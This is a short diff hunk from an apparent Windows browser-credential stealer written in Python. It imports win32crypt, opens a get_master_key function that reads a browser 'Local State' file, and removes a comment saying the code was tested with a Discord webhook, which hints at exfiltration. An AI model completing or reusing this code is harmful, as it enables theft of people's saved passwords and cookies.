@@ -8,8 +8,6 @@ import win32crypt
 from typing import List, Dict
 
 
-# MAX_MESSAGE_LENGTH = 1900 #-----This previously was tested using discord webhook.
-
 def get_master_key(local_state_path: str) -> bytes:
     try:
         with open(local_state_path, 'r', encoding='utf-8') as f:
